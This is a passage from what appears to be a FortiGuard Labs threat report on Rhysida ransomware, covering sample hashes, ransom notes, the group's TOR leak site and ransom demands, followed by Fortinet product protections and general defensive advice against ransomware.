(SHA2: a864282fea5a536510ae86c77ce46f7827687783628e4f2ceb5bf2c41b8cd3c6) drops a ransom note in PDF titled “CriticalBreachDetected.pdf.” The ransom note has Rhysida’s TOR site address, which victims are asked to visit to contact the attacker. The sample claims to have been created on May 15, 2023. The attacker appears to have created a new variant (SHA2: 258ddd78655ac0587f64d7146e52549115b67465302c0cbd15a0cba746f05595) on May 17 that drops a ransom note with the same title. However, the threat actor has also included a couple of email addresses as an alternative means of contact, probably in case victims are unfamiliar with TOR. One of the Rhysida samples we examined replaced the desktop wallpaper with the same ransom message as the dropped PDF file. Even though our analysis revealed minor differences such as those mentioned above, all of the Rhysida ransomware samples that FortiGuard Labs have collected are marked as version 0.1. The Rhysida group also operates a data leak site on TOR for ransom negotiations and exposing data stolen from the victims. At the time of our investigation, the most recent victim was a US organization in the education sector. The threat actor had demanded a ransom of 10 Bitcoins (as of August 22, 2023, one Bitcoin is worth approximately $26,000 US). However, as shown in Figure 7, the threat actor may be willing to negotiate a ransom if the counteroffer is not insultingly low. The leaks site displays stolen data in a file tree format and provides a search function. Fortinet customers are already protected from these malware variants through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Rhysida ransomware samples with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).
